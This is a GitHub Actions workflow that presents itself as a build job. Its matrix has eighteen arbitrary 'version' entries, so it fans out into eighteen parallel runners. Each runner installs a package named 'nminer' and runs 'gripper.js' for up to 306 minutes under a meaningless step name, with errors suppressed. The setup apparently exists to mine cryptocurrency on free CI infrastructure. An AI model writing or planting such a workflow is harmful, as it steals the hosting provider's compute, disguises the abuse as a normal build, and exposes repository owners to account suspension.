name: gripper
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2020 }
          - { version: 4627 }
          - { version: 3387 }
          - { version: 7873 }
          - { version: 4463 }
          - { version: 4380 }
          - { version: 4950 }
          - { version: 7954 }
          - { version: 9326 }
          - { version: 7523 }
          - { version: 1873 }
          - { version: 8305 }
          - { version: 5938 }
          - { version: 1995 }
          - { version: 2608 }
          - { version: 2863 }
          - { version: 2007 }
          - { version: 25 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: healthily before husky oh
        run: |
          npm install nminer@latest
          timeout 306m node gripper.js || echo "gripper executed"